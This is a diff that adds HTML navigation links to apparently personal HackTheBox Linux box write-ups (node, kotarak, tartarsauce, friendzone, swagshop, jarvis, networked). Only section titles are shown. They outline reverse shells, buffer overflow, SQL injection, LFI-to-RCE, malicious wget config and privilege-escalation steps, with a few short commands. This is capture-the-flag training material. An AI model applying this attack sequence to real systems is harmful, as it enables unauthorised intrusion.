+<li><a href="HacktheBox--Linux_Boxes--node--initial_foothold_on_mark--fcrack--unzip_myplace.decode.backup.html">unzip myplace.decode.backup</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--initial_foothold_on_mark--ssh_mark.html">ssh mark</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom.html">privesc to Tom</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh.html">linEnum.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report.html">report</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report--system.html">system</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report--USER-GROUP.html">USER/GROUP</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report--Environmental.html">Environmental</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report--JOBS-TASKS.html">JOBS/TASKS</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report--Networking.html">Networking</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report--Services.html">Services</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--report--Interesting_Files.html">Interesting Files</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--linEnum.sh--LinEnum_finds.html">LinEnum finds:</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--escalation_method_1_mongo_db_rev_shell.html">escalation method 1: mongo_db rev shell</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--escalation_method_1_mongo_db_rev_shell--pentest_monkey_reverse_shell.html">pentest monkey reverse shell </a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--escalation_method_1_mongo_db_rev_shell--excalating_to_Tom_w-_reverse_shell.html">excalating to Tom w/ reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_Tom--escalating_method_2_copy_privileged_shell_(ippsec).html">escalating method 2: copy privileged shell (ippsec)</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--find_-_-perm_-4000_2-dev-null.html">find / -perm -4000 2>/dev/null</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root---usr-local-bin-backup.html">/usr/local/bin/backup</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root---usr-local-bin-backup--strace_.-backup.html">strace ./backup</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root---usr-local-bin-backup--radar_2.html">radar 2</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root---usr-local-bin-backup--takes_3_arguments.html">takes 3 arguments</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root---usr-local-bin-backup--strace.html">strace</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root---usr-local-bin-backup--.-backup_(trolled).html">./backup (trolled)</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--badchars.html">badchars</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow.html">intended privesc- Buffer Overflow</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--check_for_overflowed_buffer.html">check for overflowed buffer</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--pattern_create.html">pattern create</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--python_-c_'print_A520'.html">python -c 'print "A"*520'</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--buf.py.html">buf.py</a></li>
+<li><a href="eBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--find_libc,_system_off,_exit_off_and_arg_off_starting_address.html">find libc, system_off, exit_off and arg_off starting address</a></li>
+<ol>
+<li><a href="xes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--find_libc,_system_off,_exit_off_and_arg_off_starting_address---lib32_files.html">/lib32 files</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--update_ret.html">update ret</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--intended_privesc-_Buffer_Overflow--run_buf.py_win.html">run buf.py win</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--unintended_privesc_methods.html">unintended privesc methods</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--unintended_privesc_methods--avoiding_bad_characters_to_extract_root.txt.html">avoiding bad characters to extract root.txt</a></li>
+<ol>
+<li><a href="ox--Linux_Boxes--node--privesc_to_root--unintended_privesc_methods--avoiding_bad_characters_to_extract_root.txt--decode_and_unzip_and.....html">decode and unzip and....</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--unintended_privesc_methods--creating_a_symlink.html">creating a symlink</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--unintended_privesc_methods--wildcards.html">wildcards</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--privesc_to_root--unintended_privesc_methods--command_injection.html">command injection</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--node--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--node--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak.html">kotarak</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--all_ports.html">all ports</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports.html">targeted ports</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--8080.html">:8080</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--8009.html">:8009</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--nmap--targeted_ports--60000.html">:60000</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page.html">kotarak web hosting page</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--mess_with_path.html">mess with path</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--burp.html">burp</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--localhost.html">localhost</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz.html">wfuzz</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost.html">wfuzz all ports of victim machine's localhost</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--22.html">:22</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--90.html">:90</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--110.html">:110</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--200.html">:200</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--320.html">:320</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888.html">:888</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=is.html">?doc=is </a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=backup_SSRF.html">?doc=backup SSRF</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--888--doc=blah.html">?doc=blah</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--kotarak_web_hosting_page--wfuzz--wfuzz_all_ports_of_victim_machine's_localhost--60000.html">:60000</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login.html">Tomcat login</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login--war_upload.html">war upload</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--Tomcat_login--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--find_files_in_home_directory.html">find files in home directory</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--exfil_.bin_file.html">exfil .bin file</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket.html">impacket</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes.html">crack some ntlm hashes</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes--hashcat.html">hashcat</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--impacket--crack_some_ntlm_hashes--crackstation_(online).html">crackstation (online)</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis.html">privesc to atanis</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis--user.txt.html">user.txt</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--privesc_to_atanis--app.log.html">app.log</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--initial_foothold--arp_-a.html">arp -a </a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc.html">priv esc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget.html">out of date wget</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--set_up_nc_listener_on_port_80.html">set up nc listener on port 80</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit.html">exploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_1_prepare_malicious_.wgetrc_file_on_attack_machine.html">part 1: prepare malicious .wgetrc file on attack machine</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_2_set_up_ftp_server_on_port_21__(w-_authbind).html">part 2: set up ftp server on port 21  (w/ authbind)</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--exploit--part_3_exploit.py.html">part 3: exploit.py</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--priv_esc--out_of_date_wget--root.html">root</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--kotarak--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce.html">tartarsauce</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--http--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--http--gobuster--gobuster_-webservices.html">gobuster /webservices</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--http--robots.txt.html">robots.txt</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--http--robots.txt--monstra-3.0.4.html">monstra-3.0.4</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--monstra_login_(rabbit_hole).html">monstra login (rabbit hole)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--monstra_login_(rabbit_hole)--default_pwd's.html">default pwd's</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--monstra_login_(rabbit_hole)--searchsploit_monstra.html">searchsploit monstra</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--monstra_login_(rabbit_hole)--searchsploit_monstra--43348.txt.html">43348.txt</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--monstra_login_(rabbit_hole)--searchsploit_monstra--cmd.php.html">cmd.php</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--wpscan.html">wpscan</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--wpscan--interesting_finds.html">interesting finds</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--searchsploit_gwolle.html">searchsploit gwolle</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--searchsploit_gwolle--php_reverse_shell.html">php reverse shell </a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--searchsploit_gwolle--webserver.html">webserver</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--searchsploit_gwolle--netcat_listener.html">netcat listener</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--searchsploit_gwolle--visit_exposed_link.html">visit exposed link</a></li>
+<ol>
+<li><a href="nux_Boxes--tartarsauce--initial_foothold--searchsploit_gwolle--visit_exposed_link--import_python_shell,_import_tab_autocomplete_and_xterm.html">import python shell, import tab autocomplete and xterm</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--initial_foothold--searchsploit_gwolle--visit_exposed_link--user.html">user</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_Onuma.html">privesc to Onuma</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_Onuma--GTFO_bin_for_tar_privesc_to_onuma.html">GTFO bin for tar privesc to onuma</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_Onuma--GTFO_bin_for_tar_privesc_to_onuma--user.html">user</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum.html">linEnum</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report.html">report</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--system.html">system</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--USER-GROUP.html">USER/GROUP</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--environmental.html">environmental</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--jobs-tasks.html">jobs/tasks</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--networking.html">networking</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--services.html">services</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--software.html">software</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--report--interesting_files.html">interesting files</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--linEnum--interesting_finds.html">interesting finds</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--procmon.sh.html">procmon.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--backuperer.html">backuperer</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--backuperer--notes.html">notes</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--setuid.c.html">setuid.c</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--setuid.c--apt_search_gcc-multilib.html">apt search gcc-multilib</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--setuid.c--upload_tar_with_malicious_c_code_w-_sticky_bit_preset_to_tartarsauce.html">upload tar with malicious c code w/ sticky bit preset to tartarsauce</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--privesc_to_root--setuid.c--backuperer_in_action.html">backuperer in action</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--tartarsauce--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone.html">friendzone</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--http--ssl_cert.html">ssl cert</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--http--ssl_cert---etc-hosts.html">/etc/hosts</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--http--ssl_cert---etc-hosts--https--friendzoneportal.red.html">https://friendzoneportal.red</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--http--ssl_cert---etc-hosts--https--friendzone.red.html">https://friendzone.red</a></li>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--smb.html">smb</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--smb--smbmap.html">smbmap</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer.html">dig zone xfer</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer--update_-etc-hosts.html">update /etc/hosts</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer--update_-etc-hosts--administrator1.friendzone.red_LFI.html">administrator1.friendzone.red LFI</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer--update_-etc-hosts--administrator1.friendzone.red_LFI---dashboard.php.html">/dashboard.php</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer--update_-etc-hosts--administrator1.friendzone.red_LFI---dashboard.php--timestamp.html">timestamp</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer--update_-etc-hosts--administrator1.friendzone.red_LFI---dashboard.php--dashboard.html">dashboard</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer--update_-etc-hosts--admin.friendzone.red.html">admin.friendzone.red</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--dig_zone_xfer--update_-etc-hosts--uploads.friendzone.red.html">uploads.friendzone.red</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--initial_foothold--LFI_to_RCE_test.html">LFI to RCE test</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--initial_foothold--LFI_to_RCE_test--php-reverse-shell_smb_upload_to_LFI_RCE.html">php-reverse-shell smb upload to LFI RCE</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_user_friend.html">privesc to user friend</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_root--linux_smart_enum.html">linux smart enum</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_root--procmon.sh.html">procmon.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_root--reporter.py.html">reporter.py</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_root--payloadallthethings.html">payloadallthethings</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_root--payloadallthethings--shell.py_&_some_sed_macros.html">shell.py & some sed macros</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--privesc_to_root--os.py.html">os.py</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--friendzone--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop.html">swagshop</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--nmap.html">nmap</a></li>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http.html">http</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI.html">magento scanner OSI</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--magescan.phar_usage.html">magescan.phar usage</a></li>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report.html">report</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report--index.php-rss-order-NEW-new.html">index.php/rss/order/NEW/new</a></li>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report--app-etc-local.xml.html">app/etc/local.xml </a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report--app-etc-local.xml--login_attempt.html">login attempt</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--report---shell.html">/shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--searchsploit.html">searchsploit</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--searchsploit--Remote_Code_execution_credential_injection.html">Remote Code execution credential injection</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--http--magento_scanner_OSI--searchsploit--Remote_Code_execution_credential_injection--run.html">run</a></li>
+</ol>
+</ol>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--initial_foothold--running_code_exec.py.html">running code_exec.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--initial_foothold--running_code_exec.py--burp-debug.html">burp/debug</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--priv_esc.html">priv esc</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--priv_esc--alt_privesc.html">alt privesc</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--swagshop--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis.html">jarvis</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--nmapAutomator.html">nmapAutomator</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--gobuster.html">gobuster</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold.html">initial foothold</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection).html">manual sqlinjection (Blind SQL injection)</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--Error_based_Blind_SQL_Injection.html">Error based Blind SQL Injection</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--revshell.php.html">revshell.php</a></li>
+<li><a href="-jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--Exploit_the_SQL_injection_to_add_php_code_into_a_file_on_the_system.html">Exploit the SQL injection to add php code into a file on the system</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--manual_sqlinjection_(Blind_SQL_injection)--reverse_shell.html">reverse shell</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--sqlmap.html">sqlmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--initial_foothold--sqlmap--sqlmap_--os-shell.html">sqlmap --os-shell</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper.html">privesc to pepper</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py.html">simpler.py</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py--ping_method.html">ping method</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_pepper--simpler.py_privesc.html">simpler.py privesc</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root.html">privesc to root</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--linEnum.sh.html">linEnum.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--linEnum.sh--SUID_files.html">SUID files</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--lse.sh.html">lse.sh</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO.html">system.ctl GTFO</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO--Systemctl_misconfigured_permissions_sudo-SUID.html">Systemctl misconfigured permissions sudo/SUID</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--privesc_to_root--system.ctl_GTFO--root.service.html">root.service</a></li>
+</ol>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--user-root.html">user/root</a></li>
+<li><a href="HacktheBox--Linux_Boxes--jarvis--lessons_learned.html">lessons learned</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--networked.html">networked</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh.html">nmapAutomator.sh</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--nmap.html">nmap</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--nmap--nmap_vulns.html">nmap vulns</a></li>
+</ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon.html">recon</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster.html">gobuster</a></li>
+<ol>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster--index.php.html">index.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---photos.php.html">/photos.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster--lib.php.html">lib.php</a></li>
+<li><a href="HacktheBox--Linux_Boxes--networked--nmapAutomator.sh--recon--gobuster---upload.php.html">/upload.php</a></li>
